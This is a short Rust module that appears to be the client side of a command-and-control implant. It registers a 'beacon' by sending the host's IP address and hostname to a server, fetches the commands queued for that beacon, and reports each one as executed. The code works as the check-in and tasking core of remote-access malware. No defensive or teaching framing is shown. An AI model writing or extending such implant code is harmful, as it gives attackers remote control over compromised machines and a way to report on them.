use crate::command::*;
use reqwest::blocking::Client;
use std::net::IpAddr;

pub const API_BASE_URL: &str = "http://0.0.0.0:8080";

pub struct API {
    client: Client,
}

impl API {
    pub fn new() -> Self {
        Self {
            client: Client::new(),
        }
    }
    pub fn register_beacon(&self, ip: IpAddr, hostname: String) -> u32 {
        let beacon = Beacon {
            id: 0,
            ip,
            hostname,
            commands: vec![],
        };
        let res = self
            .client
            .post(format!("{}/{}", API_BASE_URL, "beacon/register"))
            .body(serde_json::to_string(&beacon).unwrap())
            .send()
            .unwrap();
        let id = serde_json::from_str::<serde_json::Value>(&res.text().unwrap())
            .unwrap()
            .get("id")
            .unwrap()
            .as_u64()
            .unwrap();
        id.try_into().unwrap()
    }

    pub fn get_beacon_commands(&self, id: u32, unexec_only: bool) -> Vec<Command> {
        let res = self
            .client
            .get(format!(
                "{}/{}/{}/{}{}",
                API_BASE_URL, "beacon", id, "commands?unexec_only=", unexec_only
            ))
            .send()
            .unwrap();
        let commands: Vec<Command> = serde_json::from_str(&res.text().unwrap()).unwrap();
        return commands;
    }

    pub fn mark_command_executed(&self, command: &Command) {
        self.client
            .post(format!("{}/{}", API_BASE_URL, "command/execute"))
            .body(serde_json::to_string(&command).unwrap())
            .send()
            .unwrap();
    }
}
